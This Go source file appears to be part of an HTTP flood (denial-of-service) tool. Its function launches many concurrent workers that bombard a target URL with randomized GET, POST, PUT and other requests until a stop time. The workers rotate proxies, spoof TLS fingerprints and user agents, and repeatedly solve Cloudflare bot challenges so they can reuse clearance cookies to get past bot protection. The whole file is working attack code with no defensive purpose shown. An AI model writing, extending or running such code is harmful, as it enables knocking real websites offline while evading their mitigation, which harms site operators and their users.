package main

import (
	"fmt"
	mrand "math/rand"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

func executeMixVectorCFBotFight(threadCount int) {
	fmt.Printf("[VECTOR] CF BOT FIGHT — uTLS + Multi-Method + CF Solver + Cookie Rotation\n")
	ua := randomBypassUA()
	if cfg.userAgent != "" {
		ua = cfg.userAgent
	}
	solveProxy := ""
	if cfg.useProxy && len(proxyList) > 0 {
		solveProxy = getNextProxy()
	}
	solveClient := newUTLSHTTPClient()
	if solveProxy != "" {
		solveClient = getProxyClient(solveProxy)
	}
	result := solveCFChallenge(targetURL, solveClient, ua, solveProxy)
	if result.Success {
		cfStore.Set(cfg.targetHost, result.CfClearance, result.CfBm, result.UserAgent)
		fmt.Printf("[BOTFIGHT] Initial solve: clearance=%v cf_bm=%v via %s\n", result.CfClearance != "", result.CfBm != "", solveProxy)
	}

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			solveAttempts := 0
			for time.Now().Before(stopTime) {
				var proxyAddr string
				var utlsClient *http.Client
				if cfg.useProxy && len(proxyList) > 0 {
					proxyAddr = getNextProxy()
					utlsClient = getProxyClient(proxyAddr)
				} else {
					utlsClient = newUTLSHTTPClient()
				}
				applyCFStoreCookies(utlsClient, cfg.targetHost, targetURL)
				methods := []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH"}
				method := methods[rng.Intn(len(methods))]
				withBody := method == "POST" || method == "PUT" || method == "PATCH"
				reqPool := make([]*http.Request, 32)
				for p := 0; p < len(reqPool); p++ {
					reqPool[p], _ = buildRequest(method, targetURL, withBody, 2)
				}
				gotChallenge := false
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					resp, err := utlsClient.Do(reqPool[j])
					if err != nil {
						atomic.AddUint64(&totalErrors, 1)
						continue
					}
					body, _ := ioReadAll(resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&totalRequests, 1)
					switch {
					case resp.StatusCode >= 200 && resp.StatusCode < 300:
						atomic.AddUint64(&total2xx, 1)
					case resp.StatusCode >= 300 && resp.StatusCode < 400:
						atomic.AddUint64(&total3xx, 1)
					case resp.StatusCode >= 400 && resp.StatusCode < 500:
						atomic.AddUint64(&total4xx, 1)
					case resp.StatusCode >= 500:
						atomic.AddUint64(&total5xx, 1)
					}
					if isCFChallenge(resp, body) && solveAttempts < 5 {
						gotChallenge = true
						retryProxy := ""
						if cfg.useProxy && len(proxyList) > 0 {
							retryProxy = getNextProxy()
						}
						newResult := solveCFChallenge(targetURL, solveClient, ua, retryProxy)
						if newResult.Success {
							cfStore.Set(cfg.targetHost, newResult.CfClearance, newResult.CfBm, newResult.UserAgent)
							atomic.AddUint64(&totalBypass, 1)
							fmt.Printf("[BOTFIGHT] Retry solve success via %s (attempt %d)\n", retryProxy, solveAttempts+1)
						}
						solveAttempts++
						break
					}
				}
				if gotChallenge {
					time.Sleep(time.Duration(200+rng.Intn(800)) * time.Millisecond)
				} else {
					solveAttempts = 0
					time.Sleep(randomThinkTime())
				}
			}
		}(i)
	}
	wg.Wait()
}
